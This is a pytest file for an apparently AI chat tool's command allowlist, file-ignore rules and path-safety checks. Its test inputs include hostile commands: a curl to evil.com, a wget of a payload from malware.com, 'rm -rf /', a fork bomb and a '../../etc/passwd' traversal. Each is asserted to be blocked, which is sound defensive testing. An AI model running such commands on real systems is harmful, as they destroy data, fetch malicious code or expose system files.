"""Tests for command validation and path safety functions."""

from __future__ import annotations

from unittest.mock import patch

import pytest

from aorta.chat.tools.files import _is_ignored, _resolve_safe
from aorta.chat.tools.run import _validate_command


class TestValidateCommand:
    """Test _validate_command() from aorta/chat/tools/run.py."""

    @patch("aorta.chat.tools.run.settings")
    def test_allowed_command_passes(self, mock_settings):
        mock_settings.allowed_commands = ["ls", "grep", "python"]
        assert _validate_command("ls -la") is None

    @patch("aorta.chat.tools.run.settings")
    def test_allowed_with_path_prefix(self, mock_settings):
        mock_settings.allowed_commands = ["ls"]
        assert _validate_command("/usr/bin/ls -la") is None

    @patch("aorta.chat.tools.run.settings")
    def test_blocked_executable(self, mock_settings):
        mock_settings.allowed_commands = ["ls", "grep"]
        result = _validate_command("curl http://evil.com")
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_rm_rf_blocked(self, mock_settings):
        mock_settings.allowed_commands = ["rm"]
        result = _validate_command("rm -rf /")
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_wget_blocked(self, mock_settings):
        mock_settings.allowed_commands = ["wget"]
        result = _validate_command("wget http://malware.com/payload")
        assert result is not None
        assert "Blocked" in result

    @patch("aorta.chat.tools.run.settings")
    def test_empty_command(self, mock_settings):
        mock_settings.allowed_commands = ["ls"]
        result = _validate_command("")
        assert result is not None
        assert "Empty" in result

    @patch("aorta.chat.tools.run.settings")
    def test_disallowed_executable(self, mock_settings):
        mock_settings.allowed_commands = ["ls", "grep"]
        result = _validate_command("docker run something")
        assert result is not None
        assert "not in the allowlist" in result

    @patch("aorta.chat.tools.run.settings")
    def test_python_allowed(self, mock_settings):
        mock_settings.allowed_commands = ["python", "pytest"]
        assert _validate_command("python -m pytest tests/") is None

    @patch("aorta.chat.tools.run.settings")
    def test_fork_bomb_blocked(self, mock_settings):
        mock_settings.allowed_commands = ["bash"]
        result = _validate_command(":(){ :|:& };:")
        assert result is not None
        assert "Blocked" in result


class TestIsIgnored:
    """Test _is_ignored() from aorta/chat/tools/files.py."""

    def test_pycache_ignored(self):
        assert _is_ignored("__pycache__/foo.pyc") is True

    def test_git_ignored(self):
        assert _is_ignored(".git/HEAD") is True

    def test_dot_git_dir_ignored(self):
        assert _is_ignored(".git") is True

    def test_node_modules_ignored(self):
        assert _is_ignored("node_modules/package.json") is True

    def test_venv_ignored(self):
        assert _is_ignored(".venv/bin/python") is True

    def test_pyc_file_ignored(self):
        assert _is_ignored("src/foo.pyc") is True

    def test_normal_python_not_ignored(self):
        assert _is_ignored("src/main.py") is False

    def test_readme_not_ignored(self):
        assert _is_ignored("README.md") is False

    def test_nested_normal_not_ignored(self):
        assert _is_ignored("src/utils/helpers.py") is False

    def test_egg_info_ignored(self):
        assert _is_ignored("mypackage.egg-info/top_level.txt") is True


class TestResolveSafe:
    """Test _resolve_safe() from aorta/chat/tools/files.py."""

    @patch("aorta.chat.tools.files.settings")
    def test_normal_path_resolves(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        (tmp_path / "src").mkdir()
        result = _resolve_safe("src")
        assert result == (tmp_path / "src").resolve()

    @patch("aorta.chat.tools.files.settings")
    def test_traversal_raises(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        with pytest.raises(ValueError, match="escapes AORTA root"):
            _resolve_safe("../../etc/passwd")

    @patch("aorta.chat.tools.files.settings")
    def test_dot_resolves_to_root(self, mock_settings, tmp_path):
        mock_settings.aorta_root = tmp_path
        result = _resolve_safe(".")
        assert result == tmp_path.resolve()
